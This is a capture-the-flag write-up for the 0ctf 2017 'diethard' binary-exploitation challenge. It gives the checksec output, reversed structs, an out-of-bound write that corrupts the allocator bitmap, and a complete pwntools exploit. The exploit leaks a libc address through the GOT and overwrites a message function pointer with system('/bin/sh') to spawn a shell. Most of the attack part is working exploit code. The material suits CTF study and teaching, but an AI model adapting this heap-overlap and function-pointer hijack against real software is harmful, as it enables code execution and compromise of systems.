# 0ctf-2017 diethard

# checksec

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No      0               3       diethard

```

## reverse

```c
struct big_msg {  //  msg_len >= 2016
  __int64 pre_index;
  __int64 msg_len;
  __int64 msg_ptr;
  __int64 (__cdecl *print_msg)(char *, unsigned int);
};
struct small_msg { // msg_len < 2016
  __int64 pre_index;
  __int64 msg_len;
  __int64 msg_ptr;
  __int64 (__cdecl *print_msg)(char *, unsigned int);
  char msg[msg_len];
};
struct arena_table{
  char *bitmap;
  int arena_count;
  int unknown;
  struct arena_attr table[22];
};
……
else
                {
                  puts("Please Input Message:");
                  get_line_s(ptr, msg_len);
                  v7->msg_len = msg_len;
                  v7->msg_ptr = (__int64)ptr;
                  v7->print_msg = (__int64 (__cdecl *)(char *, unsigned int))print_msg;
                  v7[1].pre_index = count++;
                  add_msg_to_table((__int64)v7);
                }
……
```

key info:

- The content of small msg is integrated with the small_msg struct, while the content of big msg that msg_ptr points to is a alone memory separated.
- The arena_table allocates the arenas first, and then allocate hte bitmap side by side.
- Every size of the blocks has a arena struct.
- If the number of the blocks used is more than half of the total , program will expand arena and bitmap.
- `v7[1].pre_index`  show a out-of-bound-write vulnerability that msg struct will saved current id in the origination of the next msg sturct.

try:

|                        prev_id                        |
| :---------------------------------------------------: |
|                        msg_len                        |
|                        msg_ptr                        |
| ____int64 (__cdecl *print_msg)(char *, unsigned int); |
|                        content                        |
|                        prev_id                        |
|                        msg_len                        |
|                        msg_ptr                        |
| ____int64 (__cdecl *print_msg)(char *, unsigned int); |
|                        content                        |
|          bitmap(**overwrite with prev_id**)           |
|                          ...                          |

We can overlap a big msg block and a small msg block by overwritting the bitmap, and then overwirte the function pointer to get a shell. 

exp:

```py
from pwn import *

def Add(p, length, content):
    p.sendlineafter("3. Exit\n\n", '1')
    p.sendlineafter("Input Message Length:\n", str(length))
    p.sendlineafter("Please Input Message:\n", content)

def Del(p, index):
    p.sendlineafter("3. Exit\n\n", '2')
    p.sendlineafter('Which Message You Want To Delete?\n', str(index))

def Show(p):
    p.sendlineafter("3. Exit\n\n", '2')
    data = p.recvuntil('Which Message You Want To Delete?\n')
    p.send("1234556" + '\n')
    return data

if __name__ == '__main__':
    p = process("./diethard", env = {"LD_PRELOAD": "./libc.so.6"})
    #gdb.attach(p, '''
    #break *0x400ba2
    #continue
    #''')
    libc = ELF("./libc.so.6")
    e = ELF("./diethard")

    Add(p, 2015, "AAAAAAAA")
    Add(p, 2015, "BBBBBBBB")

    payload = ''
    payload += p64(0)
    payload += p64(0x7df)
    payload += p64(e.got['__libc_start_main'])
    payload += p64(0x400976)
    Add(p, 2047, payload)

    libc_start_main_addr = u64(Show(p).split('1. ')[1][:8])
    print "[+] libc_start_main addr = 0x%x" % libc_start_main_addr
    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    print "[+] libc_base addr = 0x%x" % libc_base_addr
    system_addr = libc_base_addr + libc.symbols['system']
    print "[+] system_addr = 0x%x" % system_addr
    binsh_addr = libc_base_addr + next(libc.search('/bin/sh'))
    print "[+] /bin/sh addr = 0x%x" % binsh_addr

    Del(p, '0')
    Del(p, '1')
    Del(p, '2')

    payload2 = ''
    payload2 += p64(0)
    payload2 += p64(0x7df)
    payload2 += p64(binsh_addr)
    payload2 += p64(system_addr)

    Add(p, 2015, "AAAAAAAA")
    Add(p, 2015, "BBBBBBBB")
    Add(p, 2047, payload2)

    p.sendlineafter("3. Exit\n\n", '2')

    p.interactive()

```





